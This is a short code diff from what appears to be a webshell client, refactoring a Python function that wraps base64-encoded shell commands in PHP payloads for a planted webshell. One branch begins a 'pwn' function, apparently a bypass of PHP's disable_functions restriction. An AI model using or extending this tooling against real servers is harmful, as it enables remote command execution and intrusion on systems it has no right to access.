@@ -187,11 +187,8 @@ def prepare_system_template(exec_func: str):
 
 def get_system_code(command: str, print_result: bool = True):
     if (gget("webshell.exec_func", "webshell")):
-        if (print_result):
-            return SYSTEM_TEMPLATE % (base64_encode(command)) + "print($o);"
-        else:
-            return SYSTEM_TEMPLATE % (base64_encode(command))
-    elif (gget("webshell.bypass_df", "webshell")):
+        return SYSTEM_TEMPLATE % (base64_encode(command)) + ("print($o);" if print_result else "")
+    elif (gget("webshell.bypass_df", "webshell") == 1):
         return """pwn(base64_decode("%s"));
 function pwn($cmd) {
     global $abc, $helper, $backtrace;
